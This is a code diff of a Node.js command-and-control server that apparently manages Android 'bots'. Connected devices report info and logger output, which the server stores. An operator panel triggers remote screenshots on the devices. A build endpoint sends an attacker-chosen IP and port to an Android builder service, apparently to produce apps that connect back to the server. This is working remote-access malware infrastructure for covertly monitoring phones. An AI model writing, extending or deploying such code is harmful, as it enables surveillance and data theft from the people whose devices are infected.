@@ -1,19 +1,17 @@
-import 'dotenv/config'
-
 import express from "express";
 import { Server } from "socket.io";
 import bodyParser from 'body-parser';
 import cors from 'cors'
 import chalk from "chalk";
+import path from 'path';
 
-import webRoute from "./routes/webRoutes.js";
 import { db } from './db.js';
 import { promises as fs } from "fs";
 
 // Variables
 const portBots = 4000
 const portMaster = 4001
-let adminSoc = null;
+let adminSockets = []; // Array de todas las conexiones frontend activas
 let devices = new Map(); // Map<device_uuid, {info: data, socket: socket}>
 // Variables
 
@@ -23,16 +21,11 @@ app.use(cors())
 app.use(bodyParser.urlencoded({ extended: true }))
 app.use(express.static('static'))
 app.use('/screenshots', express.static('screenshots', { maxAge: '1h' }))
-app.use('/', webRoute)
 
-app.post("/info", (req, res) => {
-    const device = devices.get(req.body.id);
-    if (device) {
-        res.json(device.info)
-    } else {
-        res.status(404).json({ error: "Device not found" })
-    }
-})
+// Serve main HTML file at root
+app.get('/', (req, res) => {
+    res.sendFile(path.resolve('./static/html/index.html'));
+});
 
 const masterServer = app.listen(portMaster, "0.0.0.0", () => {
     console.log(`Master Network listening on http://0.0.0.0:${portMaster}/`)
@@ -88,17 +81,14 @@ botIo.on("connection", async (socket) => {
         console.log(chalk.green(`[+] Bot Connected (${deviceUuid}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
         console.log(chalk.blue(`[i] Device ${deviceUuid} status updated to: connected = ${device.connected}`))
 
-        if (adminSoc) {
-            const deviceList = Array.from(devices.values()).map((d) => ({
-                ...d.info,
-                ID: d.info.device_uuid,
-                connected: d.connected
-            })).slice(0, 20);
-            adminSoc.emit("info", deviceList);
-            console.log(chalk.blue(`[i] Status update sent to frontend (${deviceList.filter(d => d.connected).length} connected devices)`));
-        } else {
-            console.log(chalk.yellow(`[w] Frontend not connected - status update will be sent when frontend connects`));
-        }
+        const deviceList = Array.from(devices.values()).map((d) => ({
+            ...d.info,
+            ID: d.info.device_uuid,
+            connected: d.connected
+        })).slice(0, 20);
+
+        masterIo.emit("info", deviceList);
+        console.log(chalk.blue(`[i] Status broadcast sent to ${adminSockets.length} frontend(s) (${deviceList.filter(d => d.connected).length} connected devices)`));
 
         socket.on("disconnect", async () => {
             const deviceUuid = socket.deviceUuid;
@@ -113,14 +103,12 @@ botIo.on("connection", async (socket) => {
                 await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid).catch(console.error);
 
                 console.log(chalk.redBright(`[x] Bot Disconnected (${deviceUuid})`))
-                if (adminSoc) {
-                    const deviceList = Array.from(devices.values()).map((d) => ({
-                        ...d.info,
-                        ID: d.info.device_uuid,
-                        connected: d.connected
-                    })).slice(0, 20);
-                    adminSoc.emit("info", deviceList);
-                }
+                const deviceList = Array.from(devices.values()).map((d) => ({
+                    ...d.info,
+                    ID: d.info.device_uuid,
+                    connected: d.connected
+                })).slice(0, 20);
+                masterIo.emit("info", deviceList);
             }
         })
 
@@ -132,9 +120,7 @@ botIo.on("connection", async (socket) => {
             try {
                 // console.log(`Logger from device ${deviceUuid}: ${data}`);
                 device.logs.push({ timestamp: Date.now(), log: data });
-                if (adminSoc) {
-                    adminSoc.emit("logger", { device: deviceUuid, log: data });
-                }
+                masterIo.emit("logger", { device: deviceUuid, log: data });
 
                 // Incremental storage: Append to daily logs
                 const today = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
@@ -158,7 +144,7 @@ botIo.on("connection", async (socket) => {
 
         socket.on("screenshot_response", async (data) => {
             const deviceUuid = socket.deviceUuid;
-            if (!deviceUuid || !adminSoc) return;
+            if (!deviceUuid || adminSockets.length === 0) return;
             try {
                 if (!Buffer.isBuffer(data) && !(data instanceof ArrayBuffer)) {
                     throw new Error('Invalid image data: not a buffer');
@@ -176,8 +162,7 @@ botIo.on("connection", async (socket) => {
                 await fs.mkdir('screenshots', { recursive: true });
                 await fs.writeFile(filepath, buffer);
 
-                // Emit filename; frontend constructs full URL
-                adminSoc.emit("screenshot_ready", {
+                masterIo.emit("screenshot_ready", {
                     device_uuid: deviceUuid,
                     filename: filename
                 });
@@ -185,7 +170,7 @@ botIo.on("connection", async (socket) => {
                 console.log(`Screenshot saved: screenshots/${filename}`);
             } catch (err) {
                 console.error('Screenshot response error:', err);
-                adminSoc.emit("screenshot_error", { device_uuid: deviceUuid, error: err.message });
+                masterIo.emit("screenshot_error", { device_uuid: deviceUuid, error: err.message });
             }
         })
     } catch (error) {
@@ -194,55 +179,89 @@ botIo.on("connection", async (socket) => {
     }
 })
 
-// Socket io Connection for Master
+// Socket io Connection for Master (Frontend)
 const masterIo = new Server(masterServer);
 masterIo.on("connection", (socket) => {
-    if (adminSoc == null) {
-        console.log(chalk.greenBright(`[+] Master got Connected (${socket.id})`))
-        adminSoc = socket
-        const deviceList = Array.from(devices.values()).map((d) => ({
+    console.log(chalk.greenBright(`[+] Frontend Connected (${socket.id}) - Total: ${adminSockets.length + 1}`))
+    adminSockets.push(socket);
+
+    // Enviar lista actual a la nueva conexión
+    const deviceList = Array.from(devices.values()).map((d) => ({
+        ...d.info,
+        ID: d.info.device_uuid,
+        connected: d.connected
+    })).slice(0, 20);
+    socket.emit("info", deviceList);
+
+    // Forzar actualización después de 1 segundo (para sincronizar reconexiones)
+    setTimeout(() => {
+        const currentDeviceList = Array.from(devices.values()).map((d) => ({
             ...d.info,
             ID: d.info.device_uuid,
             connected: d.connected
         })).slice(0, 20);
-        socket.emit("info", deviceList); // Send current list on connect
 
-        socket.on("get_device_logs", (id) => {
-            const device = devices.get(id);
-            if (device && device.logs) {
-                socket.emit("device_logs", device.logs.map(l => l.log));
-            } else {
-                socket.emit("device_logs", []);
-            }
-        });
-
-        setTimeout(() => {
-            const currentDeviceList = Array.from(devices.values()).map((d) => ({
-                ...d.info,
-                ID: d.info.device_uuid,
-                connected: d.connected
-            })).slice(0, 20);
-
+        const hasConnectedDevices = currentDeviceList.some(d => d.connected === true);
+        if (hasConnectedDevices) {
+            console.log(chalk.blue(`[i] Frontend ${socket.id} - forcing device status update`));
             socket.emit("info", currentDeviceList);
-        }, 1000); // Esperar 1 segundo para asegurar que la conexión esté estable
+        }
+    }, 1000);
 
-        socket.on("screenshot_req", (deviceId) => {
-            console.log(`Relaying screenshot request to device: ${deviceId}`);
-            const device = devices.get(deviceId);
-            if (device && device.socket) {
-                device.socket.emit("screenshot");
-                console.log(chalk.green(`Screenshot request sent to app.`))
+    socket.on("get_device_logs", (id) => {
+        const device = devices.get(id);
+        if (device && device.logs) {
+            socket.emit("device_logs", device.logs.map(l => l.log));
+        } else {
+            socket.emit("device_logs", []);
+        }
+    });
+
+    socket.on("screenshot_req", (deviceId) => {
+        console.log(`Relaying screenshot request to device: ${deviceId}`);
+        const device = devices.get(deviceId);
+        if (device && device.socket) {
+            device.socket.emit("screenshot");
+            console.log(chalk.green(`Screenshot request sent to app.`))
+        } else {
+            console.log(chalk.red(`Device ${deviceId} not found or socket disconnected`))
+        }
+    });
+
+    socket.on("get_device_info", (deviceId) => {
+        const device = devices.get(deviceId);
+        if (device) {
+            socket.emit("device_info", device.info);
+        } else {
+            socket.emit("device_info_error", { error: "Device not found" });
+        }
+    });
+
+    socket.on("build_request", async (data) => {
+        const { ip, port } = data;
+        console.log(`Build request for ${ip}:${port}`);
+
+        try {
+            const response = await fetch('http://android-builder:8080/build', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip, port })
+            });
+            const result = await response.json();
+
+            if (result.success) {
+                socket.emit("build_success", { success: true });
             } else {
-                console.log(chalk.red(`Device ${deviceId} not found or socket disconnected`))
+                socket.emit("build_error", { success: false, error: 'Build failed' });
             }
-        });
+        } catch (error) {
+            console.error('Build request error:', error);
+            socket.emit("build_error", { success: false, error: 'Build request failed' });
+        }
+    });
 
-        socket.on("disconnect", () => {
-            console.log(chalk.red(`[x] Master got Disconnected (${socket.id})`))
-            adminSoc = null
-        })
-
-    } else {
-        socket.disconnect()
-    }
+    socket.on("disconnect", () => {
+        adminSockets = adminSockets.filter(s => s.id !== socket.id);
+        console.log(chalk.red(`[x] Frontend Disconnected (${socket.id}) - Remaining: ${adminSockets.length}`))
+    });
 })
